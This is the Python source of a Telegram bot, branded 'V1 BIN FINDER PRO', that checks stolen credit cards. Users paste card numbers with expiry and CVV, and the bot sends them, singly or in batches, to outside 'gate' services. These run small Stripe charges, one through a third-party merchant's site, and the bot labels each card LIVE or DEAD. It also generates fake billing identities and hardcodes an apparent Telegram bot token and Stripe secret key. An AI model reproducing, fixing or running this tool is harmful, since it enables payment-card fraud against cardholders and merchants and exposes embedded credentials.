
import telebot
import httpx
import re
import random
from telebot import types
from concurrent.futures import ThreadPoolExecutor

# --- CONFIG ---
TOKEN = "8318488317:AAF-76qS6IXP8fncpd2y9gpiEXwtzHOdOLY" 
bot = telebot.TeleBot(TOKEN, parse_mode="HTML")
executor = ThreadPoolExecutor(max_workers=20)

# --- ADDRESS DATA (Localized) ---
NAMES = {
    "USA": {"fn": ["James", "Robert"], "ln": ["Smith", "Brown"], "flag": "🇺🇸", "zip": "10001"},
    "UK": {"fn": ["Oliver", "Harry"], "ln": ["Taylor", "Evans"], "flag": "🇬🇧", "zip": "E1 6AN"},
    "IN": {"fn": ["Arjun", "Aarav"], "ln": ["Sharma", "Patel"], "flag": "🇮🇳", "zip": "400001"},
    "CA": {"fn": ["Liam", "Noah"], "ln": ["Roy", "Gagnon"], "flag": "🇨🇦", "zip": "M5V 2N2"}
}

# --- KEYBOARDS ---
def main_menu():
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    # The text here MUST match the message_handler text below exactly
    markup.add(types.KeyboardButton("💳 Check Card"), types.KeyboardButton("🏠 Address Gen"))
    return markup

def gate_menu(cc_data):
    markup = types.InlineKeyboardMarkup(row_width=2)
    # Using a shorter format to prevent "Button data too long" errors
    markup.add(
        types.InlineKeyboardButton("⚡ SK", callback_data=f"gt|sk|{cc_data}"),
        types.InlineKeyboardButton("🔥 Auto", callback_data=f"gt|as|{cc_data}"),
        types.InlineKeyboardButton("🚀 BOTH", callback_data=f"gt|both|{cc_data}")
    )
    return markup

# --- API CORE ---
def call_api(gate, full_cc):
    try:
        full_cc = full_cc.strip()
        if gate == "sk":
            url = f"https://skbased.blinkop.online/?sk=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&amount=1&lista={full_cc}"
        else:
            url = f"https://autostripe.blinkop.online/check?gateway=autostripe&key=BlackXCard&site=chiwahwah.co.nz&cc={full_cc}"
        
        with httpx.Client(timeout=25.0) as client:
            res = client.get(url).text.strip()
            low = res.lower()
            if any(x in low for x in ["success", "approved", "cvv live"]):
                return f"✅ <b>LIVE:</b> <code>{res[:70]}</code>"
            return f"❌ <b>DEAD:</b> <code>{res[:70]}</code>"
    except:
        return "⚠️ <b>OFFLINE/TIMEOUT</b>"

# --- HANDLERS ---

@bot.message_handler(commands=['start'])
def start(message):
    bot.send_message(message.chat.id, "<b>💎 V1 BIN FINDER PRO</b>\nStatus: 🟢 System Active", reply_markup=main_menu())

# FIXED: Explicit handler for the "Check Card" button
@bot.message_handler(func=lambda m: m.text == "💳 Check Card")
def check_card_btn(message):
    bot.send_message(message.chat.id, "<b>📥 Send your card or list:</b>\nFormat: <code>CC|MM|YY|CVV</code>")

@bot.message_handler(func=lambda m: m.text == "🏠 Address Gen")
def address_btn(message):
    markup = types.InlineKeyboardMarkup()
    btns = [types.InlineKeyboardButton(f"{v['flag']} {k}", callback_data=f"adr|{k}") for k, v in NAMES.items()]
    markup.add(*btns)
    bot.send_message(message.chat.id, "<b>🌍 Select Country:</b>", reply_markup=markup)

@bot.message_handler(func=lambda m: True)
def auto_detect(message):
    # Regex finds all cards in the message
    cards = re.findall(r'\d{15,16}\|\d{1,2}\|\d{2,4}\|\d{3,4}', message.text)
    if not cards:
        return

    if len(cards) == 1:
        bot.reply_to(message, f"💳 <b>Single Card:</b> <code>{cards[0]}</code>", reply_markup=gate_menu(cards[0]))
    else:
        # MASS CHECK LOGIC
        msg = bot.reply_to(message, f"📂 <b>Mass Check:</b> {len(cards)} cards detected.\n<i>Processing via AutoStripe...</i>")
        results = []
        # Limit mass check to 10 for performance
        for cc in cards[:10]:
            res = call_api("as", cc)
            results.append(f"<code>{cc}</code> -> {res}")
        
        bot.edit_message_text("\n".join(results), msg.chat.id, msg.message_id)

@bot.callback_query_handler(func=lambda call: True)
def callbacks(call):
    p = call.data.split("|")
    
    if p[0] == "adr":
        c = NAMES[p[1]]
        addr = f"{c['flag']} <b>{p[1]} ADDR</b>\n👤 <b>Name:</b> <code>{random.choice(c['fn'])} {random.choice(c['ln'])}</code>\n📮 <b>Zip:</b> <code>{c['zip']}</code>"
        bot.edit_message_text(addr, call.message.chat.id, call.message.message_id)
        
    elif p[0] == "gt":
        gate, cc = p[1], p[2]
        bot.edit_message_text(f"⏳ <b>Checking:</b> <code>{cc}</code>", call.message.chat.id, call.message.message_id)
        
        if gate == "both":
            f1, f2 = executor.submit(call_api, "sk", cc), executor.submit(call_api, "as", cc)
            res = f"<b>Gate 1:</b> {f1.result()}\n<b>Gate 2:</b> {f2.result()}"
        else:
            res = f"<b>Result:</b> {call_api(gate, cc)}"
            
        bot.edit_message_text(f"<b>🏁 Finished</b>\n<code>{cc}</code>\n{res}", call.message.chat.id, call.message.message_id)

# --- START ---
print("✅ V1 Fixed is running...")
bot.infinity_polling()
